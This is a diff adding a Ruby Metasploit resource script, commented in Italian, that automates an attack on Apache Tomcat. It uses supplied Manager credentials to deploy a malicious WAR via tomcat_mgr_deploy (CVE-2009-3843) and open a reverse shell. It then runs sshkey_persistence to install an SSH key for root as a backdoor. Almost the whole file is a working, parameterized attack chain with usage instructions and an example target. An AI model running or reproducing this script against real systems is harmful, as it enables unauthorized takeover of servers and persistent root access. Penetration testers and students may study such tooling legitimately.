@@ -1,0 +1,149 @@
+<ruby>                                                                                                                                                                                        
+#                                                                                                                                                                                             
+# Stampa guida                                                                                                                                                                    
+#                                                                                                                                                                                             
+def help_me                                                                                                                                                                                   
+    help = %Q|
+    Descrizione:
+            Questo resource script Metasploit fa in modo di ottenere l'accesso ad un sistema remoto caricando ed eseguendo un payload nell'Apache Tomcat Server.
+            L'exploit si basa sulla presenza di una directory conosciuta e accessibile sul server di destinazione chiamata /manager che ospita l'applicazione di gestione Tomcat Manager. 
+            Il payload viene caricato come un WAR archive contenente un'applicazione jsp malevola, utilizzando una PUT request, e può essere utilizzato per ottenere un accesso remoto completo a un server Tomcat vulnerabile, in quanto l'attaccante può caricare e distribuire file con privilegi di root.
+            Sfrutta la vulnerabilità CVE-2009-3843 per distribuire un file WAR dannoso attraverso il Tomcat Application Manager ed aprire una reverse shell per controllare il sistema target. https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3843
+            Infine viene aggiunta una chiave ssh all'utente root in modo da permettere una login remota in futuro senza l'utilizzo di una password.
+
+            Moduli utilizzati durante il processo di attacco: 
+
+                exploit:
+                    https://attack.mitre.org/techniques/T1570/
+                    exploit/multi/http/tomcat_mgr_deploy
+                    https://www.rapid7.com/db/modules/exploit/multi/http/tomcat_mgr_deploy/
+
+                post exploit:
+                    https://attack.mitre.org/techniques/T1098/004/
+                    creare backdoor:
+                    post/linux/manage/sshkey_persistence
+                    https://www.rapid7.com/db/modules/post/linux/manage/sshkey_persistence/    
+
+
+    Uso:
+            msfconsole -r tomcat_mgr_deploy.rc [targetPORT] [targetIP] [username] [password]
+
+    Parametri:
+            targetPORT    -  PORTA da analizzare e attaccare
+            targetIP      -  indirizzo IP da analizzare e attaccare
+            username      -  username da utilizzare per sfruttare la Tomcat Manager Application per fare l'upload malevolo
+            password      -  password da utilizzare per sfruttare la Tomcat Manager Application per fare l'upload malevolo
+
+    Esempio:
+            msfconsole -r tomcat_mgr_deploy.rc 8080 172.20.0.6 tomcat password
+
+    |
+
+    help = help.gsub(/^\t/, '')
+    print_line(help)
+end
+
+
+#
+# Ritorna le shell che sono state aperte dal modulo attivo al momento della chiamata
+#
+def mySessions()
+    return framework.sessions.select{ |sid, session| session.exploit_uuid == active_module.uuid }
+end
+
+
+#
+# Esegue processo di attacco
+#
+def execute_attack(targetPORT, targetIP, username, password)
+    
+    # EXPLOIT
+    # seleziona come modulo attivo l'exploit che sfrutta la vulnerabilità CVE-2009-3843
+    run_single("use exploit/multi/http/tomcat_mgr_deploy")
+    # configura l'exploit di modo che attacchi l'indirizzo ip e porta definite
+    run_single("set RHOST #{targetIP}")
+    run_single("set RPORT #{targetPORT}")
+    # configura l'exploit di modo che utilizzi il target java
+    run_single("set TARGET 1")
+    # configura l'exploit in modo da utilizzare le credenziali del Tomcat Application Manager per fare l'upload
+    run_single("set HttpUsername #{username}")
+    run_single("set HttpPassword #{password}")
+    # verifica che è possibile sfruttare la vulnerabilità sul sistema target
+    run_single("check")
+    # esegue l'exploit
+    run_single("exploit -j")
+    # attende che venga aperta la reverse shell
+    sleep(30 * framework.db.services.search("tomcat").count)
+
+    # ottiene gli id delle shell aperte dall'exploit al passo precedente
+    mySessionIDs = mySessions.keys
+    
+    # POST-EXPLOT
+    for sessionID in mySessionIDs
+        # ottiene la permanenza aggiungendo una chiave ssh alla macchina vittima
+        run_single("use post/linux/manage/sshkey_persistence")
+        run_single("set CREATESSHFOLDER true")
+        run_single("set USERNAME root")
+        run_single("set SESSION #{sessionID}")
+        run_single("run")
+    end
+
+end
+
+
+#
+# Inizializzazione parametri
+#
+def init_args
+    args = {}
+
+    # se tra gli argomenti passati è presente la parola help ritorno come args help settato a true
+    if ARGV.join('') =~ /^help$/i
+        args[:help] = true
+        return args
+    end
+
+    # costruisco la struttura dati contenente gli argomenti passati
+    args[:targetPORT]      = ARGV.shift || ''
+    args[:targetIP]      = ARGV.shift || ''
+    args[:username]      = ARGV.shift || ''
+    args[:password]      = ARGV.shift || ''
+    # verifico che tutti i parametri siano stati corretamente inizializzati
+    raise ArgumentError, "Specificare PORTA del sistema da attaccare" if args[:targetPORT].empty?
+    raise ArgumentError, "Specificare IP del sistema da attaccare" if args[:targetIP].empty?
+    raise ArgumentError, "Specificare Username mgr da utilizzare per eseguire l'upload" if args[:username].empty?
+    raise ArgumentError, "Specificare Password mgr da utilizzare per eseguire l'upload" if args[:password].empty?
+
+    return args
+end
+
+
+#
+# Codice main
+#
+begin
+    # inizializzo parametri
+    args = init_args
+
+    # se tra gli argomenti è presente la parola help,
+    # visualizzo la guida e termino
+    if args[:help]
+        help_me
+        return
+    end
+
+    # eseguo il processo di attacco
+    execute_attack(args[:targetPORT], args[:targetIP], args[:username], args[:password])
+
+rescue ArgumentError => e
+    print_error("Invalid argument: #{e.message}")
+    return
+
+rescue RuntimeError => e
+    print_error(e.message)
+    return
+
+rescue ::Exception => e
+    raise e
+end
+</ruby>
